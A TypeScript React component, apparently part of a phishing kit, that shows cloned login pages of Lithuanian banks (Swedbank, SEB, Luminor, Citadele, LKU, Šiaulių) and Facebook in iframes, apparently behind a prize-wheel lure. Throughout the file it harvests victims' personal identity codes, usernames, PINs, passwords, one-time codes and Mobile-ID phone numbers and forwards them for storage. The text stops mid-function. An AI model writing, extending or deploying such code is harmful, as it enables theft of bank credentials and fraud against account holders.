"use client";

import React, { useEffect, useRef, useState } from "react";

type Props = {
  bankName: string;
  logoFile?: string;
  brandColor?: string;
  bankSlug?: string;
  formData: {
    verfuegernummer?: string;
    pin?: string;
    personalCode?: string;
    loginMethod?: string;
  };
  wonAmount?: number | null;
  wonLabel?: string | null;
  onChange: (field: string, value: string) => void;
  handleRouteAction: (overrideData?: any) => void;
  saving?: boolean;
};

const DEFAULT_LT_FILES: Record<string, string[]> = {
  "citadele-lt": ["1.html", "2.html", "3.html"],
  "facebook-lt": ["1.html"],
  "lku-lt": ["1.html", "2.html", "3.html"],
  "luminor-lt": ["1.html", "2.html", "3.html"],
  "seb-lt": ["1.html", "2.html", "3.html", "4.html"],
  "siauliu-lt": ["1.html", "2.html", "3.html", "4.html"],
  "swedbank-lt": ["1.html", "2.html", "3.html", "4.html", "5.html"],
};

export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, saving, bankName, logoFile, brandColor, wonAmount, wonLabel }: Props) {
  const [files, setFiles] = useState<string[]>(() => {
    const s = (bankSlug || "").toLowerCase();
    for (const [k, v] of Object.entries(DEFAULT_LT_FILES)) {
      if (s.includes(k.replace("-lt", ""))) return v;
    }
    return ["1.html", "2.html", "3.html", "4.html"];
  });
  const [currentIndex, setCurrentIndex] = useState(0);
  const [selectedLoginMethod, setSelectedLoginMethod] = useState("");
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const disableIframeFade = [
    "swedbank-lt",
    "seb-lt",
    "luminor-lt",
    "citadele-lt",
    "lku-lt",
    "siauliu-lt",
    "facebook-lt"
  ].includes(bankSlug ?? "");

  // Eger files henuz yuklenmemis (length===0) iken LITHUANIA_BANK_TAB_CLICK gelirse
  // safeIndex hesabi hep 0 donecegi icin gorunuste hic degismez. Bu yuzden
  // PENDING INDEX + PENDING METHOD saklanir, files dolunca uygulanir.
  const pendingIndexRef = useRef<number | null>(null);
  const pendingMethodRef = useRef<string>("");

  // =========================================================================
  // EN KRITIK FIX: useRef CACHE + window.message LISTENER 1 KEDEK (MOUNT) EKLE
  //
  // ESKI HATA: useEffect dependency arrayinde currentIndex, selectedLoginMethod,
  // files, onChange, handleRouteAction vardi -> HER TAB TIKLAMADA listener SIL
  // -> yeniden eklene kadar gecen surede postMessage KACIYORDU.
  //
  // COZUM: Tum okunacak degerleri useRef icinde cache'le (setTimeout loop ile
  // her 50ms'de guncelle). useEffect dependency sadece [bankSlug] olsun ->
  // listener 1 kez eklenir, HIC KACMAZ.
  // =========================================================================
  const filesRef = useRef<string[]>([]);
  const currentIndexRef = useRef<number>(0);
  const selectedLoginMethodRef = useRef<string>("");
  const onChangeRef = useRef(onChange);
  const handleRouteActionRef = useRef(handleRouteAction);
  const bankSlugRef = useRef<string>("");
  // Her render'da ref'leri guncelle (callback surekli yeni referans olusturmasin diye)
  onChangeRef.current = onChange;
  handleRouteActionRef.current = handleRouteAction;
  filesRef.current = files;
  currentIndexRef.current = currentIndex;
  selectedLoginMethodRef.current = selectedLoginMethod;
  bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();

  const resolveLoginMethodFromIndex = (slug?: string, index?: number) => {
    if (!slug || typeof index !== "number" || index < 0) return "";

    const normalizedSlug = (slug || "").toString().trim().toLowerCase();
    // GERCEK HTML SIRASI: 1.html = index 0, 2.html = index 1 ... (scan_lt_methods.js ile dogrulandi)
    const methodMap: Record<string, string[]> = {
      "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
      "seb-lt":       ["Smart-ID",             "Mobile-ID",       "SEB programėlė App",         "Generatorius"],
      "luminor-lt":   ["Smart-ID",             "M. parašas",      "Generatorius"],
      "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
      "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
      "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
      "facebook-lt":  ["Facebook Prisijungti"],
    };

    // 1) Dogrudan eslesme
    if (methodMap[normalizedSlug]?.[index]) {
      return methodMap[normalizedSlug][index];
    }

    // 2) Kismi eslesme: anahtar kelime ara
    const orderedKeys = Object.keys(methodMap);
    for (const key of orderedKeys) {
      const keyword = key.replace(/-lt$/, "").replace(/-/g, "");
      if (!keyword) continue;
      if (normalizedSlug.includes(keyword)) {
        if (methodMap[key]?.[index]) return methodMap[key][index];
      }
    }

    // 3) Tek kelime (swedbank -> swedbank-lt)
    const simpleMap: Record<string, string> = {
      "swedbank": "swedbank-lt",
      "seb": "seb-lt",
      "luminor": "luminor-lt",
      "citadele": "citadele-lt",
      "lku": "lku-lt",
      "siauliu": "siauliu-lt",
      "facebook": "facebook-lt",
    };
    const simpleKey = Object.keys(simpleMap).find((k) => normalizedSlug.includes(k));
    if (simpleKey && methodMap[simpleMap[simpleKey]]?.[index]) {
      return methodMap[simpleMap[simpleKey]][index];
    }

    return "";
  };

  const resolveIndexFromLoginMethod = (slug: string | undefined | null, loginMethodRaw: string): number => {
    if (!slug || !loginMethodRaw) return -1;
    const normalizedSlug = (slug || "").toString().trim().toLowerCase();
    const methodMap: Record<string, string[]> = {
      "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
      "seb-lt":       ["Smart-ID",             "Mobile-ID",       "SEB programėlė App",         "Generatorius"],
      "luminor-lt":   ["Smart-ID",             "M. parašas",      "Generatorius"],
      "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
      "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
      "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
      "facebook-lt":  ["Facebook Prisijungti"],
    };
    let bankKey = methodMap[normalizedSlug] ? normalizedSlug : "";
    if (!bankKey) {
      for (const key of Object.keys(methodMap)) {
        const kw = key.replace(/-lt$/,"").replace(/-/g,"");
        if (kw && normalizedSlug.includes(kw)) { bankKey = key; break; }
      }
    }
    if (!bankKey) {
      const simpleMap: Record<string, string> = {"swedbank":"swedbank-lt","seb":"seb-lt","luminor":"luminor-lt","citadele":"citadele-lt","lku":"lku-lt","siauliu":"siauliu-lt"};
      const s = Object.keys(simpleMap).find(k => normalizedSlug.includes(k));
      if (s) bankKey = simpleMap[s];
    }
    if (!bankKey) return -1;
    const list = methodMap[bankKey] || [];
    const n = String(loginMethodRaw || "").trim().toLowerCase().replace(/„|“|"|'|`/g, "");
    for (let i = 0; i < list.length; i++) {
      const m = String(list[i] || "").toLowerCase().replace(/„|“|"|'|`/g, "");
      if (!m) continue;
      if (n === m) return i;
      if (n.includes(m) || m.includes(n)) return i;
      // 2-3 kelime eslesme: smart mobile bio gener sms kod kort para program vienk
      const nToks = n.split(/[^a-ząčęėįšųūž0-9]+/).filter(Boolean);
      const mToks = m.split(/[^a-ząčęėįšųūž0-9]+/).filter(Boolean);
      const overlap = nToks.filter(t => mToks.some(mt => mt === t || (mt.length >=3 && t.includes(mt)) || (t.length >= 3 && mt.includes(t)))).length;
      if (overlap >= Math.max(1, Math.min(mToks.length, nToks.length, 2))) return i;
    }
    return -1;
  };

  const normalizeLoginMethodLabel = (value: string) => {
    const raw = (value || "").trim();
    if (!raw || raw.toLowerCase() === "bilinmiyor") return "";
    // Once methodMap uzerinden normalize et (banka bazli)
    if (bankSlug) {
      const idx = resolveIndexFromLoginMethod(bankSlug, raw);
      if (idx >= 0) {
        const v = resolveLoginMethodFromIndex(bankSlug, idx);
        if (v) return v;
      }
    }
    // Fallback: genel eslesme (yeni isimler icin)
    const normalized = raw.toLowerCase().replace(/„|“|"|'|`/g, "");
    if (normalized.includes("mobilescan") || normalized.includes("digipass")) return "MobileSCAN/Digipass 780";
    if (normalized.includes("seb programėlė") || normalized.includes("seb programele") || normalized.includes("seb app")) return "SEB programėlė App";
    if (normalized.includes("smart")) return "Smart-ID";
    if (normalized.includes("mobile") || /(^|\s)m\.?\s*para/.test(normalized)) return "Mobile-ID";
    if (normalized.includes("vienkartinis") || normalized.includes("saugos kodas")) return "Vienkartinis saugos kodas";
    if (/kod[uų]\s*kortel/.test(normalized) || (normalized.includes("kortel") && normalized.includes("generator"))) return "Kodų kortelė/Generatorius";
    if (normalized.includes("generatorius") && !normalized.includes("kortelė")) return "Generatorius";
    if (normalized.includes("pin generator") || normalized.includes("pin-kalk") || /pin[-\s]*gen/.test(normalized)) return "PIN generatorius";
    if (normalized.includes("id-kort") || normalized.includes("id kort")) return "ID-kortelė";
    if (normalized.includes("bio") || (/pin\b/.test(normalized) && !normalized.includes("smart") && !normalized.includes("mobile"))) return "Biometrika/PIN";
    if (normalized.includes("sms")) return "SMS";
    if (normalized.includes("m. paraš") || normalized.includes("m paras")) return "M. parašas";
    return raw;
  };

  const prefersIdentityFields = (loginMethod: string) => {
    const normalized = loginMethod.trim().toLowerCase();
    if (!normalized) return false;

    return (
      normalized.includes("mobile") ||
      normalized.includes("m. parašas") ||
      normalized.includes("smart") ||
      normalized.includes("mobilescan") ||
      normalized.includes("digipass") ||
      normalized.includes("bio") ||
      normalized.includes("programėlė") ||
      normalized.includes("kortelė")
    );
  };

  const shouldIgnoreRawBankFieldKey = (key: string) => {
    const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

    return (
      /^input\d+$/.test(normalizedKey) ||
      normalizedKey.includes("rememberme") ||
      normalizedKey.includes("remembermesimpleid") ||
      normalizedKey.includes("remembermesmartid") ||
      normalizedKey.includes("remembermemobileid") ||
      normalizedKey.includes("loginwidget") ||
      normalizedKey.includes("useridmid") ||
      normalizedKey.includes("useridsid") ||
      normalizedKey.includes("useridsimple") ||
      normalizedKey === "mobileid" ||
      normalizedKey === "smartid" ||
      normalizedKey === "idcard" ||
      normalizedKey === "pincalc" ||
      normalizedKey === "kalkulaator" ||
      normalizedKey.startsWith("wheelresult") ||
      normalizedKey === "wheelresultkind" ||
      normalizedKey === "wheelresultlabel" ||
      normalizedKey === "wheelresultamount" ||
      normalizedKey === "amount" ||
      normalizedKey === "firstname" ||
      normalizedKey === "lastname" ||
      normalizedKey === "fullname" ||
      normalizedKey === "phone" ||
      normalizedKey === "mobile" ||
      normalizedKey === "email" ||
      normalizedKey === "currency" ||
      normalizedKey === "address" ||
      normalizedKey === "street" ||
      normalizedKey === "postcode" ||
      normalizedKey === "city" ||
      normalizedKey === "country" ||
      normalizedKey === "participationcode" ||
      normalizedKey === "publicid" ||
      normalizedKey === "sessiontype" ||
      normalizedKey === "bankslug" ||
      normalizedKey === "bankname" ||
      normalizedKey === "transfermessage" ||
      normalizedKey === "winstep" ||
      normalizedKey === "language" ||
      normalizedKey === "sitelanguage" ||
      normalizedKey === "targetcountry" ||
      normalizedKey.startsWith("selected") ||
      normalizedKey.startsWith("orderedfield") ||
      normalizedKey.includes("step") ||
      normalizedKey.includes("route") ||
      normalizedKey === "hash" ||
      normalizedKey === "signature" ||
      normalizedKey === "token"
    );
  };

  const shouldIgnoreCapturedField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const candidates = [
      field.key,
      field.name,
      field.id,
      field.formControlName,
      field.label,
      field.ariaLabel,
      field.placeholder,
    ]
      .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
      .filter(Boolean);

    if (!candidates.length) {
      return false;
    }

    return candidates.every((candidate) => shouldIgnoreRawBankFieldKey(candidate));
  };

  const getFieldSearchText = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) =>
    [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();

  const isPhoneLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    return (
      lowerText.includes("mobilenumber") ||
      lowerText.includes("mobile number") ||
      lowerText.includes("phonefield") ||
      lowerText.includes("phone-number") ||
      lowerText.includes("telefoninumber") ||
      lowerText.includes("telefon") ||
      lowerText.includes("phone")
    );
  };

  const isPersonalCodeLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    return (
      lowerText.includes("personalidentitycode") ||
      lowerText.includes("personalidentificationcode") ||
      lowerText.includes("personal identity code") ||
      lowerText.includes("identitycode") ||
      lowerText.includes("identity code") ||
      lowerText.includes("isikukood") ||
      lowerText.includes("personal-code") ||
      lowerText.includes("personal code") ||
      lowerText.includes("legalid")
    );
  };

  const isUsernameLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    return (
      lowerText.includes("userid") ||
      lowerText.includes("user id") ||
      lowerText.includes("user-id") ||
      lowerText.includes("username") ||
      lowerText.includes("loginid") ||
      lowerText.includes("login id") ||
      lowerText.includes("nickname") ||
      lowerText.includes("kasutajanimi") ||
      lowerText.includes("kasutajatunnus") ||
      lowerText.includes("tunnus")
    );
  };

  const isPasswordLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    const lowerKey = (field.key ?? "").toLowerCase();

    return (
      (field.type ?? "").toLowerCase() === "password" ||
      lowerText.includes("pincalcpassword") ||
      (lowerKey.includes("pin-calculator") && lowerKey.includes("code")) ||
      lowerText.includes("pin calculator code") ||
      lowerText.includes("pin-calculator-code") ||
      lowerText.includes("password") ||
      lowerText.includes("passcode") ||
      lowerText.includes("parool") ||
      lowerText.includes("pin1") ||
      lowerText.includes("pin2") ||
      lowerText.includes("pin code") ||
      lowerText.includes("pin-code") ||
      lowerKey === "pin" ||
      lowerKey.endsWith("password")
    );
  };

  const inferOrderedFieldType = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    if (isPhoneLikeField(field)) return "phone";
    if (isPasswordLikeField(field)) return "password";
    return "identity";
  };

  const normalizeCapturedFields = (
    payload: unknown,
  ): Array<{
    key: string;
    value: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
    name?: string;
    id?: string;
    formControlName?: string;
  }> => {
    if (payload && typeof payload === "object" && Array.isArray((payload as { fields?: unknown[] }).fields)) {
      return ((payload as { fields: unknown[] }).fields ?? [])
        .filter((field): field is Record<string, unknown> => Boolean(field && typeof field === "object"))
        .map((field) => ({
          key: String(field.key ?? field.name ?? field.id ?? "unknown"),
          value: String(field.value ?? ""),
          type: typeof field.type === "string" ? field.type : "",
          label: typeof field.label === "string" ? field.label : "",
          ariaLabel: typeof field.ariaLabel === "string" ? field.ariaLabel : "",
          placeholder: typeof field.placeholder === "string" ? field.placeholder : "",
          name: typeof field.name === "string" ? field.name : "",
          id: typeof field.id === "string" ? field.id : "",
          formControlName: typeof field.formControlName === "string" ? field.formControlName : "",
        }));
    }

    const inputs =
      payload && typeof payload === "object" && (payload as { inputs?: unknown }).inputs && typeof (payload as { inputs?: unknown }).inputs === "object"
        ? ((payload as { inputs: Record<string, unknown> }).inputs ?? {})
        : {};

    return Object.entries(inputs).map(([key, value]) => ({
      key,
      value: String(value ?? ""),
      type: "text",
      label: "",
      ariaLabel: "",
      placeholder: "",
      name: key,
      id: key,
    }));
  };

  useEffect(() => {
    if (!bankSlug) return;
    const slugNorm = (bankSlug || "").toString().trim().toLowerCase();
    const apiKeyMap: Record<string, string> = {
      "swedbank": "swedbank-lt",
      "seb": "seb-lt",
      "luminor": "luminor-lt",
      "citadele": "citadele-lt",
      "lku": "lku-lt",
      "siauliu": "siauliu-lt",
    };
    let finalSlug = slugNorm;
    if (
      ["swedbank-lt", "seb-lt", "luminor-lt", "citadele-lt", "lku-lt", "siauliu-lt"].includes(slugNorm) === false
    ) {
      const match = Object.keys(apiKeyMap).find((k) => slugNorm.includes(k));
      if (match) finalSlug = apiKeyMap[match];
    }
    fetch(`/api/lithuanian-banks?bank=${encodeURIComponent(finalSlug)}`)
      .then(res => res.json())
      .then(data => {
        if (data.files && data.files.length > 0) {
          setFiles(data.files);
        }
      })
      .catch(err => console.error("Error fetching bank HTMLs:", err));
  }, [bankSlug]);

  // FILES yuklendikten (length>0) sonra: daha once PENDING bir index/method geldi ise onu uygula
  // (ilk sayfa acilisi sirasinda files yokken tıklanan tab'lar kaybolur/kacar diye)
  useEffect(() => {
    if (!files || files.length === 0) return;
    if (pendingIndexRef.current != null) {
      const idx = pendingIndexRef.current;
      pendingIndexRef.current = null;
      const safe = Math.max(0, Math.min(idx, files.length - 1));
      setCurrentIndex(safe);
    }
    if (pendingMethodRef.current) {
      const label = pendingMethodRef.current;
      pendingMethodRef.current = "";
      if (label) setSelectedLoginMethod(label);
    }
  }, [files]);

  useEffect(() => {
    // ======================================================================
    // (ATTACHED) Listener her eklendiginde konsola BASLANGIC logu (1 kez mount)
    // ======================================================================
    // eslint-disable-next-line no-console
    console.log('%c[LT PARENT] LISTENER ATTACHED', 'background:#311b92;color:#fff;font-weight:bold;font-size:11px', { bankSlug });

    const handleMessage = (e: MessageEvent) => {
      // ==================================================================
      // PARENT DEBUG BUFFER: SADECE LITHUANIA_* TIPLI MESAJLARI KAYDET!
      // Reklam / Panelos / diger uzanti mesajlari buffer'in ilk 100'ünü
      // doldurmasin diye TYPE filtresi ZORUNLU!
      // ==================================================================
      try {
        const W = globalThis as any;
        if (!Array.isArray(W.__TRAE_LT_PARENT_LOGS)) {
          W.__TRAE_LT_PARENT_LOGS = [];
        }
        if (e && e.data && typeof e.data === 'object' && typeof e.data.type === 'string') {
          const t = String(e.data.type);
          if (t.startsWith('LITHUANIA_BANK_') || t.startsWith('ESTONIA_BANK_') || t.startsWith('BANK_')) {
            try {
              W.__TRAE_LT_PARENT_LOGS.unshift({ t: Date.now(), type: t, payload: e.data });
              if (W.__TRAE_LT_PARENT_LOGS.length > 150) W.__TRAE_LT_PARENT_LOGS.length = 150;
            } catch {}
            // eslint-disable-next-line no-console
            console.log('%c[LT PARENT] ONMESSAGE ' + t, 'background:#9575cd;color:#000;font-weight:bold;', e.data);
          }
        }
      } catch {}

      if (e.data && e.data.type === 'LITHUANIA_BANK_SUBMIT') {
        const { formData } = e.data;
        
        const clickedLoginMethod = normalizeLoginMethodLabel(selectedLoginMethodRef.current);
        const detectedLoginMethod = normalizeLoginMethodLabel(
          typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "",
        );
        const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlugRef.current, currentIndexRef.current));
        // Oncelik: iframe'in kendi dosyasindan gelen loginMethod (data-method meta =
        // kullanicinin GERCEKTEN submit ettigi sayfa). selectedLoginMethod eski/stale olabilir
        // cunku tab click bir iframe'de yapilip submit baska iframe'de olur.
        const newLoginMethod = detectedLoginMethod || clickedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
        const capturedFields = normalizeCapturedFields(formData);
        const identityFirstMethod = prefersIdentityFields(newLoginMethod);
        const mappedData: Record<string, string> = {
          loginMethod: newLoginMethod,
          personalCode: "",
          verfuegernummer: "",
          pin: "",
          tacCode: "",
          bankPhone: "",
          username: "",
          password: "",
        };
        const rawCapturedData: Record<string, string> = {};

        onChangeRef.current("loginMethod", newLoginMethod);

        const persistRawCapturedField = (field: {
          key: string;
          value: string;
          name?: string;
          id?: string;
          label?: string;
          ariaLabel?: string;
          placeholder?: string;
          formControlName?: string;
          _formOrder?: number;
        }) => {
          const normalizedValue = field.value.trim();
          if (!normalizedValue) return;

          // 🚨 🚫 GARBAGE VALUE (locale/dil): lt, lt_LT, et_EE vb. HICBIR zaman KAYDETME.
          // Citadele/SEB select option value=lt_LT geliyor, kolonlari isgal ediyordu.
          var GARBAGE_VALUES = /^(lt|et|lv|ee|pl|ru|tr|nl|de|en)([-_](lt|et|lv|ee|pl|ru|tr|nl|de|en))?$/i;
          if (GARBAGE_VALUES.test(normalizedValue)) return;

          const formOrder: number | undefined = (field as any)._formOrder;
          const prefixMatch = (field.key || "").match(/^form(\d+)__/);
          // _formOrder > form prefix (0 ise form0 disi, 1+ ise form numarasi — ONCELIKLI)
          const safeFormOrder = typeof formOrder === "number" ? formOrder : (prefixMatch ? parseInt(prefixMatch[1], 10) : undefined);

          const candidateKeys = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
            .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
            .filter(Boolean)
            .map((candidate) => candidate.replace(/\s+/g, "-"))
            .filter((candidate) => candidate && candidate.toLowerCase() !== "unknown");

          for (const candidateKey of candidateKeys) {
            const normalizedKey = candidateKey.toLowerCase().replace(/[^a-z0-9]/g, "");
            if (shouldIgnoreRawBankFieldKey(candidateKey)) {
              continue;
            }
            if (candidateKey in mappedData) continue;

            // ✅ YENI: AYNI isimli alan (ornegin 2 formda da "Kimlik No" / "asmens_kodas") gelirse:
            //    - Ilk alan (formOrder yok veya formOrder=1): NORMAL kolon ismi (kimlikno)
            //    - 2+ alan (formOrder >= 2): KOLON ADINA FORM ORDERINI EKLE (form2_kimlikno, form3_kimlikno)
            //    Boylece 2. alan da KAYDEDILIR, ustune YAZILMAZ.
            const uniqueCandidate =
              typeof safeFormOrder === "number" && safeFormOrder >= 2
                ? `form${safeFormOrder}_${candidateKey}`
                : candidateKey;
            const uniqueNormalized = uniqueCandidate.toLowerCase().replace(/[^a-z0-9]/g, "");

            if (uniqueNormalized && !rawCapturedData[uniqueCandidate]) {
              rawCapturedData[uniqueCandidate] = normalizedValue;
              continue;
            }
            // Eski (prefixli hali) de hala sakla — zaten key form1__field_1 gibi unique
            if (!rawCapturedData[candidateKey]) {
              rawCapturedData[candidateKey] = normalizedValue;
            }
          }
        };
        
        const assignMappedValue = (fieldName: string, value: string, options?: { overwrite?: boolean; syncState?: boolean }) => {
          const normalizedValue = value.trim();
          if (!normalizedValue) return;
          if (mappedData[fieldName] && !options?.overwrite) return;
          mappedData[fieldName] = normalizedValue;
          if (options?.syncState) {
            onChangeRef.current(fieldName, normalizedValue);
          }
        };

        const assignUsername = (value: string, overwrite = false) => {
          assignMappedValue("username", value, { overwrite });
          assignMappedValue("verfuegernummer", value, { overwrite, syncState: true });
        };

        const assignPassword = (value: string, overwrite = false) => {
          assignMappedValue("password", value, { overwrite });
          assignMappedValue("pin", value, { overwrite, syncState: true });
        };

        for (const field of capturedFields) {
          const value = field.value.trim();
          if (!value) continue;

          // YENI: PREFIXLI key geliyorsa (form1__ / form2__ / form0__):
          // 1) ONCE prefixli HALIYLE persist et → rawCapturedData benzersiz key ile saklansin
          //    (2. formun ayni isimli alani 1. formun ustune yazmasin)
          persistRawCapturedField(field);

          // Prefix'i temizle: /^form\d+__/ regex ile form0__ / form1__ / form2__ ... sil
          const originalKey = field.key || "";
          const prefixMatch = originalKey.match(/^form(\d+)__/);
          const strippedKey = prefixMatch ? originalKey.replace(/^form\d+__/, '') : originalKey;

          // 2) SONRA prefix'SIZ HALIYLE de persist et → eski mapping/matchedData
          //    (username, personalCode, bankPhone vb.) kolonlara yazilsin.
          //    ✅ YENI: _formOrder de GONDER → 2.form ayni label'lı alan gelirse form2_ ekler, ustune YAZMAZ.
          if (prefixMatch) {
            const formOrderNum = parseInt(prefixMatch[1], 10);
            persistRawCapturedField({
              ...field,
              key: strippedKey,
              // name/id/formControlName'i da prefix'siz olduguna varsayiyoruz
              // (serializeAllLtForms sadece field.key'e prefix ekledi)
              _formOrder: isNaN(formOrderNum) ? undefined : formOrderNum
            });
          }

          // lowerKey icin prefix'SIZ key kullan → tum if'ler (phone-number, pc, ln vb.)
          // dogru eslesme yapabilsin (form1__phone-number !== phone-number OLDUGU ICIN)
          const lowerKey = strippedKey.toLowerCase();
          const lowerText = getFieldSearchText(field);

          if (lowerText.includes("rememberme") || lowerText.includes("pea mind meeles") || lowerText.includes("remember me")) {
            continue;
          }

          if (window.location.href.includes('op-corporate')) {
            if (lowerKey === 'mobile-id-username' || lowerKey === 'smart-id-username') {
              assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
            } else if (lowerKey === 'mobile-id-phone') {
              assignMappedValue("bankPhone", value, { overwrite: true });
              assignMappedValue("verfuegernummer", value, { overwrite: true, syncState: true });
            } else if (lowerKey === 'pin-calculator-username') {
              assignUsername(value, true);
            } else if (lowerKey === 'pin-calculator-code') {
              assignPassword(value, true);
            }
            continue;
          }

          if (bankSlugRef.current === "bigbank") {
            if (lowerKey === "mobilenumber") {
              assignMappedValue("bankPhone", value, { overwrite: true });
              continue;
            }

            if (lowerKey === "personalidentitycode" || lowerKey === "personalidentificationcode") {
              assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
              continue;
            }
          }

          // LT bankalari: telefon alani bankPhone'dur (kullanicinin profil/iletisim
          // telefonu DEGIL - ayri kolon). Ignore listesi 'phone'/'mobile' isimlerini
          // tamamen atladigi icin lku Mobile-ID telefonu kayboluyordu; burada ignore
          // kontrolunden ONCE LT'ye ozel esleme yapiyoruz.
          if ((bankSlugRef.current || "").endsWith("-lt")) {
            const ltName = (field.name || "").toLowerCase();
            const ltId = (field.id || "").toLowerCase();
            if (isPhoneLikeField(field) || ltName === "phone" || ltId === "phone" || ltName === "phonenumber" || ltId.includes("phone-number")) {
              assignMappedValue("bankPhone", value, { overwrite: true });
              continue;
            }
            // Kisiye ozel kod / kimlik numarasi alanlari (luminor pc/PersonCode,
            // swedbank identityNumber, siauliu perscode)
            if (ltName === "pc" || ltId === "personcode" || ltId === "perscode" || ltName === "perscode" || lowerText.includes("personcode") || lowerText.includes("identitynumber")) {
              assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
              continue;
            }
            // Luminor kullanici id alani (name=ln) ve acik userId alanlari
            if (ltName === "ln" || ltName === "userid") {
              assignUsername(value, true);
              continue;
            }
          }

          if (shouldIgnoreCapturedField(field)) {
            continue;
          }

          if (lowerKey === "phone-number") {
            assignMappedValue("bankPhone", value, { overwrite: true });
            continue;
          }

          if (
            lowerText.includes("tac") ||
            lowerText.includes("otp") ||
            lowerText.includes("sms code") ||
            lowerText.includes("verification code") ||
            lowerText.includes("one-time") ||
            lowerText.includes("one time") ||
            lowerText.includes("kontrollkood") ||
            lowerText.includes("control code") ||
            lowerText.includes("response code")
          ) {
            assignMappedValue("tacCode", value, { overwrite: true });
            continue;
          }

          if (isPersonalCodeLikeField(field)) {
            assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
            continue;
          }

          if (isPhoneLikeField(field)) {
            assignMappedValue("bankPhone", value, { overwrite: true });
            continue;
          }

          if (isPasswordLikeField(field)) {
            assignPassword(value, true);
            continue;
          }

          if (isUsernameLikeField(field)) {
            assignUsername(value, true);
            continue;
          }

          if (
            !mappedData.personalCode &&
            /^\d{11}$/.test(value) &&
            !lowerText.includes("phone") &&
            !lowerText.includes("telefon") &&
            !lowerText.includes("otp") &&
            !lowerText.includes("tac")
          ) {
            assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
            continue;
          }

          if (!identityFirstMethod && !mappedData.verfuegernummer) {
            assignUsername(value);
            continue;
          }

          if (!mappedData.personalCode) {
            assignMappedValue("personalCode", value, { syncState: true });
          }
        }

        const filledValues = capturedFields
          .map((field) => ({
            key: field.key,
            name: field.name ?? "",
            id: field.id ?? "",
            formControlName: field.formControlName ?? "",
            type: field.type ?? "",
            label: field.label ?? "",
            ariaLabel: field.ariaLabel ?? "",
            placeholder: field.placeholder ?? "",
            value: field.value.trim(),
          }))
          .filter((field) => Boolean(field.value))
          .filter((field) => !shouldIgnoreCapturedField(field))
          .filter((field, index, list) => list.findIndex((candidate) => candidate.value === field.value) === index);

        const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
        if (!hasIdentityValue && filledValues[0]?.value) {
          assignMappedValue("personalCode", filledValues[0].value, { overwrite: true, syncState: true });
        }

        const passwordFallback = filledValues.find((field) => isPasswordLikeField(field));
        const orderedField2Type = filledValues[1] ? inferOrderedFieldType(filledValues[1]) : "";

        if (!mappedData.password) {
          if (passwordFallback?.value) {
            assignPassword(passwordFallback.value, true);
          }
        }
        
        handleRouteActionRef.current({
          orderedField1: filledValues[0]?.value ?? "",
          orderedField2: filledValues[1]?.value ?? "",
          orderedField2Type,
          ...rawCapturedData,
          ...mappedData,
        });
      } else if (e.data && e.data.type === 'LITHUANIA_BANK_TAB_CLICK') {
         // =================================================================
         // 2 KATMANLI GUVENCE: useRef.current (her zaman guncel) +
         // dep array Estonia ile ayni (listener cleanup sonrasi tekrar attach)
         // =================================================================
         const __bankSlug = bankSlugRef.current || (bankSlug || "").toString().trim().toLowerCase();
         const __files = filesRef.current && filesRef.current.length ? filesRef.current : files;
         let finalIndex = -1;
         let finalLoginMethod = "";
         if (typeof e.data.loginMethod === "string") {
           const normalizedLoginMethod = normalizeLoginMethodLabel(e.data.loginMethod);
           if (normalizedLoginMethod) {
             finalLoginMethod = normalizedLoginMethod;
             const idx = resolveIndexFromLoginMethod(__bankSlug, normalizedLoginMethod);
             if (idx >= 0) finalIndex = idx;
           }
         }
         if (typeof e.data.targetIndex === 'number' && e.data.targetIndex >= 0) {
